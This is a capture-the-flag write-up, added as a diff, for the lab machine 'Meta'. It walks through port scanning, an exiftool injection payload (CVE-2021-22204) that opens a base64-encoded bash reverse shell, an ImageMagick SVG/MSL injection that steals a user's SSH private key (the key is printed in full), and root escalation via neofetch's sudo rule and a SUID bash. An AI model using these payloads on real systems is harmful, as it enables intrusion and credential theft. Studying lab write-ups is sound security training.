@@ -1,0 +1,259 @@
+<h1 id="meta">Meta</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.11.140</p>
+
+<p>The port scan reported the following opened ports</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis</span><span class="o">=</span>
+|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
+80/tcp open  http    syn-ack Apache httpd
+|_http-server-header: Apache
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://artcorp.htb
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<ul>
+  <li>HTTP</li>
+  <li>domain → artcorp.htb</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/linux/meta/enumeration</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="nt">-I</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">11</span><span class="o">.</span><span class="nf">140</span><span class="w">                    
+</span><span class="n">HTTP/1.1</span><span class="w"> </span><span class="nx">301</span><span class="w"> </span><span class="nx">Moved</span><span class="w"> </span><span class="nx">Permanently</span><span class="w">
+</span><span class="n">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">01</span><span class="w"> </span><span class="n">Dec</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">13</span><span class="w"> </span><span class="n">GMT</span><span class="w">
+</span><span class="n">Server</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="w">
+</span><span class="n">Location</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="n">//artcorp.htb</span><span class="w">
+</span><span class="nx">Content-Type:</span><span class="w"> </span><span class="nx">text/html</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="nt">-8</span><span class="w">
+
+                                                                                                                                                                                                                                           
+</span><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/linux/meta/enumeration</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">whatweb</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">11</span><span class="o">.</span><span class="nf">140</span><span class="w">                                                                                                                                
+</span><span class="n">http</span><span class="p">:</span><span class="n">//10.10.11.140</span><span class="w"> </span><span class="p">[</span><span class="mi">301</span><span class="w"> </span><span class="n">Moved</span><span class="w"> </span><span class="n">Permanently</span><span class="p">]</span><span class="w"> </span><span class="nx">Apache</span><span class="p">,</span><span class="w"> </span><span class="nx">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span><span class="w"> </span><span class="nx">HTTPServer</span><span class="p">[</span><span class="n">Apache</span><span class="p">],</span><span class="w"> </span><span class="nx">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">11</span><span class="o">.</span><span class="nf">140</span><span class="p">],</span><span class="w"> </span><span class="nx">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="n">//artcorp.htb</span><span class="p">]</span><span class="w">
+</span><span class="n">http</span><span class="p">:</span><span class="n">//artcorp.htb</span><span class="w"> </span><span class="p">[</span><span class="mi">200</span><span class="w"> </span><span class="n">OK</span><span class="p">]</span><span class="w"> </span><span class="nx">Apache</span><span class="p">,</span><span class="w"> </span><span class="nx">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span><span class="w"> </span><span class="nx">HTML5</span><span class="p">,</span><span class="w"> </span><span class="nx">HTTPServer</span><span class="p">[</span><span class="n">Apache</span><span class="p">],</span><span class="w"> </span><span class="nx">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">11</span><span class="o">.</span><span class="nf">140</span><span class="p">],</span><span class="w"> </span><span class="nx">Title</span><span class="p">[</span><span class="n">Home</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Nothing in the root of the web page</p>
+
+<ul>
+  <li>directory enumeration → nothing</li>
+  <li>subdomain enumeration
+    <ul>
+      <li>dev01.artcorp.htb</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="dev01artcorphtb">dev01.artcorp.htb</h3>
+
+<ul>
+  <li>Maybe there are more applicationts that aren’t displayed</li>
+</ul>
+
+<p><img src="Meta%203c36fefecf464a5d827cec5be8c89ef4/Untitled.png" alt="Untitled" /></p>
+
+<ul>
+  <li>
+    <p>/metaview</p>
+
+    <p><img src="Meta%203c36fefecf464a5d827cec5be8c89ef4/Untitled%201.png" alt="Untitled" /></p>
+  </li>
+</ul>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>There are various vectors of attack tat we can try:</p>
+
+<ul>
+  <li>command injection?</li>
+  <li>php may be interpreted if we inject code in the metadata?</li>
+  <li>php library to extract metadata vulnerable?</li>
+  <li>exiftool searchexploit?</li>
+</ul>
+
+<p>It seems it is vulnerable to a CVE for exiftool → CVE-2021-22204</p>
+
+<p><img src="Meta%203c36fefecf464a5d827cec5be8c89ef4/Untitled%202.png" alt="Untitled" /></p>
+
+<p>Following the indications this blog <a href="https://ine.com/blog/exiftool-command-injection-cve-2021-22204">https://ine.com/blog/exiftool-command-injection-cve-2021-22204</a> we can craft a malicous image that contains metadata taht will be executed by the server.</p>
+
+<h3 id="gaining-a-reverse-shell">Gaining a reverse shell</h3>
+
+<ul>
+  <li>create payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/meta/exploit]
+└─<span class="nv">$ </span><span class="nb">cat </span>payload              
+<span class="o">(</span>metadata <span class="s2">"</span><span class="se">\c</span><span class="k">${</span><span class="nv">system</span><span class="p">(</span><span class="s1">'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MyAwPiYxCg== | base64 -d | bash'</span><span class="p">)</span><span class="k">}</span><span class="s2">;"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Encode payload and generate malicious djvu file</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/meta/exploit]
+└─<span class="nv">$ </span>bzz payload payload.bzz
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/meta/exploit]
+└─<span class="nv">$ </span>djvumake exploit.djvu <span class="nv">INFO</span><span class="o">=</span><span class="s1">'1,1'</span> <span class="nv">BGjp</span><span class="o">=</span>/dev/null <span class="nv">ANTz</span><span class="o">=</span>payload.bzz
+</code></pre></div></div>
+
+<ul>
+  <li>Create malicious jpg file that can be uploaded to the server</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/meta/exploit]
+└─<span class="nv">$ </span><span class="nb">cat </span>configfile           
+%Image::ExifTool::UserDefined <span class="o">=</span> <span class="o">(</span>
+<span class="s1">'Image::ExifTool::Exif::Main'</span> <span class="o">=&gt;</span> <span class="o">{</span>
+    0xc51b <span class="o">=&gt;</span> <span class="o">{</span>
+        Name <span class="o">=&gt;</span> <span class="s1">'HasselbladExif'</span>,
+        Writable <span class="o">=&gt;</span> <span class="s1">'string'</span>,
+        WriteGroup <span class="o">=&gt;</span> <span class="s1">'IFD0'</span>,
+    <span class="o">}</span>,
+<span class="o">}</span>,
+<span class="o">)</span><span class="p">;</span>
+1
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/meta/exploit]
+└─<span class="nv">$ </span>exiftool <span class="nt">-config</span> configfile <span class="s1">'-HasselbladExif&lt;=exploit.djvu'</span> wallpaper.jpg
+    1 image files updated
+</code></pre></div></div>
+
+<p>Once uploaded we will have our reverse shell in the listener.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/meta]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.140] 41782
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>597<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@meta:/var/www/dev01.artcorp.htb/metaview<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h3 id="pivoting-to-user-thomas">Pivoting to user Thomas</h3>
+
+<p>We are going to pivot to user thomas, since we will probably have more privilege than www-data.</p>
+
+<ul>
+  <li>There are no binaries or files outside his user home directory that are owned by thomas</li>
+  <li>He isn’t running any program</li>
+  <li>There are no mentions to his name in any system file</li>
+  <li>We cannot run commands as Thomas using sudo</li>
+</ul>
+
+<p>If we ran <a href="https://github.com/DominicBreuker/pspy">pspy</a> and wait some minutes we will have something interesting.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/12/01 03:01:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3427   | /bin/sh <span class="nt">-c</span> /usr/local/bin/convert_images.sh 
+2023/12/01 03:01:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3428   | /bin/bash /usr/local/bin/convert_images.sh 
+2023/12/01 03:01:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3429   | /bin/bash /usr/local/bin/convert_images.sh 
+2023/12/01 03:01:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3430   | /usr/sbin/CRON <span class="nt">-f</span> 
+2023/12/01 03:01:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3431   | /bin/sh <span class="nt">-c</span> <span class="nb">rm</span> /tmp/<span class="k">*</span> 
+2023/12/01 03:01:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3432   | /bin/bash /usr/local/bin/convert_images.sh 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3435   | /usr/sbin/CRON <span class="nt">-f</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3434   | /usr/sbin/cron <span class="nt">-f</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3433   | /usr/sbin/CRON <span class="nt">-f</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3436   | /usr/sbin/CRON <span class="nt">-f</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3437   | 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3438   | /bin/bash /usr/local/bin/convert_images.sh 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3439   | /usr/sbin/CRON <span class="nt">-f</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3441   | /bin/sh <span class="nt">-c</span> <span class="nb">rm</span> /tmp/<span class="k">*</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3440   | /usr/sbin/CRON <span class="nt">-f</span> 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3442   | /bin/sh <span class="nt">-c</span> <span class="nb">cp</span> <span class="nt">-rp</span> ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
+2023/12/01 03:02:01 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>3443   | pkill mogrify
+</code></pre></div></div>
+
+<p>Thomas is running the following script every two minutes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@meta:/tmp<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/convert_images.sh 
+<span class="c">#!/bin/bash</span>
+<span class="nb">cd</span> /var/www/dev01.artcorp.htb/convert_images/ <span class="o">&amp;&amp;</span> /usr/local/bin/mogrify <span class="nt">-format</span> png <span class="k">*</span>.<span class="k">*</span> 2&gt;/dev/null
+pkill mogrify
+</code></pre></div></div>
+
+<p>mogrify is actually a symbolic link to magick. Searching for vulnerabilitie int his blog the author explain how to exploit this <a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a>.</p>
+
+<p>We have to create svg file  and copy to /var/www/dev01.artcorp.htb/convert_images/</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@meta:/home/thomas<span class="nv">$ </span><span class="nb">cat</span> /tmp/poc.svg 
+&lt;image <span class="nv">authenticate</span><span class="o">=</span><span class="s1">'ff" `echo $(cat ~/.ssh/id_rsa) &gt; ~/test.txt`;"'</span><span class="o">&gt;</span>
+  &lt;<span class="nb">read </span><span class="nv">filename</span><span class="o">=</span><span class="s2">"pdf:/etc/passwd"</span>/&gt;
+  &lt;get <span class="nv">width</span><span class="o">=</span><span class="s2">"base-width"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"base-height"</span> /&gt;
+  &lt;resize <span class="nv">geometry</span><span class="o">=</span><span class="s2">"400x400"</span> /&gt;
+  &lt;write <span class="nv">filename</span><span class="o">=</span><span class="s2">"test.png"</span> /&gt;
+  &lt;svg <span class="nv">width</span><span class="o">=</span><span class="s2">"700"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"700"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span> xmlns:xlink<span class="o">=</span><span class="s2">"http://www.w3.org/1999/xlink"</span><span class="o">&gt;</span>       
+  &lt;image xlink:href<span class="o">=</span><span class="s2">"msl:poc.svg"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"100"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"100"</span>/&gt;
+  &lt;/svg&gt;
+&lt;/image&gt;
+</code></pre></div></div>
+
+<p>If we wait we will have the thomas ssh key in a file called test.txt in his home folder.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@meta:/home/thomas<span class="nv">$ </span><span class="nb">cat </span>test.txt 
+<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY----- 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 <span class="nv">bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE</span><span class="o">=</span> <span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
+www-data@meta:/home/thomas<span class="err">$</span>
+</code></pre></div></div>
+
+<p>In this page <a href="https://www.samltool.com/format_privatekey.php">https://www.samltool.com/format_privatekey.php</a> we can give the key the correct format and use to log in as thomas via ssh.</p>
+
+<h3 id="from-thomas-to-root">From Thomas to root</h3>
+
+<p>Once we are user Thomas we can see that we have a sudo right.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@meta:~/.config/neofetch<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>thomas on meta:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, env_keep+<span class="o">=</span>XDG_CONFIG_HOME
+
+User thomas may run the following commands on meta:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/neofetch <span class="se">\"\"</span>
+</code></pre></div></div>
+
+<p>We can execute neofetch but without any arguments. However we see that there is an uncommon option in this output.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">env_keep+=XDG_CONFIG_HOME</code> → this means that we can keep this env variable once we execute root</li>
+</ul>
+
+<p>We can see that te config file for neofetch is in  <code class="language-plaintext highlighter-rouge">/home/thomas/.config/neofetch</code> . In neofetch there is a way to execute any command we want but we have to specify this in the config file with the switch <code class="language-plaintext highlighter-rouge">exec=&lt;command&gt;</code> . Setting all this pieces togther we can escalate privielges.</p>
+
+<ul>
+  <li>We set the env variable</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">XDG_CONFIG_HOME</span><span class="o">=</span>/home/thomas/.config/
+</code></pre></div></div>
+
+<ul>
+  <li>We add <code class="language-plaintext highlighter-rouge">exec=$(chmod u+s /bin/bash)</code> at the end of the config file</li>
+  <li>We execute <code class="language-plaintext highlighter-rouge">sudo /usr/bin/neofetch</code></li>
+  <li>Bash binary should be SUID and allow us to get a shell as root</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@meta:~/.config/neofetch<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1168776 Apr 18  2019 /bin/bash
+thomas@meta:~/.config/neofetch<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
